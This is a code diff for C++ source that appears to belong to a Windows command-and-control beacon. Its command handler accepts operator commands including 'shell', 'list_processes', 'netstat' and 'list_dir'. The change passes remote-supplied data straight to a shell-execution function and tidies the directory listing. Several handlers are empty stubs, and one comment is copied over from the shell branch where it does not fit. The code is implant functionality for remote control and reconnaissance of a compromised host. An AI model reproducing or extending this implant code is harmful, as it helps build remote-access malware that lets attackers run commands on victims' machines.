@@ -113,7 +113,7 @@ std::string listDirectory(const std::string& directory) {
     HANDLE hFind = FindFirstFile((directory + "\\*").c_str(), &findFileData);
 
     if (hFind == INVALID_HANDLE_VALUE) {
-        return "Error opening directory";
+        return "Error opening directory: " + directory;
     }
 
     std::stringstream ss;
@@ -124,6 +124,8 @@ std::string listDirectory(const std::string& directory) {
 
     do {
         std::string fileName = findFileData.cFileName;
+        if (fileName == "." || fileName == "..") continue; // Skip current and parent directory entries
+
         DWORD fileSize = findFileData.nFileSizeLow;
         DWORD fileAttributes = findFileData.dwFileAttributes;
 
@@ -149,12 +151,11 @@ std::string listDirectory(const std::string& directory) {
 }
 
 
-std::string command_handler(const std::string& command, const std::string& uuid){
+std::string command_handler(const std::string& command, const std::string& command_data, const std::string& uuid){
     if (command == "shutdown") {
     } else if (command == "switch_beacon") {
-    } else if (command.rfind("shell", 0) == 0) { // need to check if it starts with shell, limitation of current beacon on server
-        std::string shell_command = command.substr(6); // Get the command after "shell "
-        std::string output = executeShellCommand(shell_command.c_str());
+    } else if (command == "shell") {
+        std::string output = executeShellCommand(command_data.c_str());
         std::cout << "Shell command output: " << output << std::endl;
         return output;
     } else if (command == "list_processes") {
@@ -172,9 +173,8 @@ std::string command_handler(const std::string& command, const std::string& uuid)
     } else if (command == "list_services") {
     } else if (command == "disk_usage") {
     } else if (command == "netstat") {
-    } else if (command.rfind("list_dir", 0) == 0) { // need to check if it starts with shell, limitation of current beacon on server
-        std::string shell_command = command.substr(6); // Get the command after "shell "
-        std::string output = listDirectory(shell_command.c_str());
+    } else if (command == "list_dir") { // need to check if it starts with shell, limitation of current beacon on server
+        std::string output = listDirectory(command_data.c_str());
         return output;
     } else {
         std::cerr << "Unknown command: " << command << std::endl;
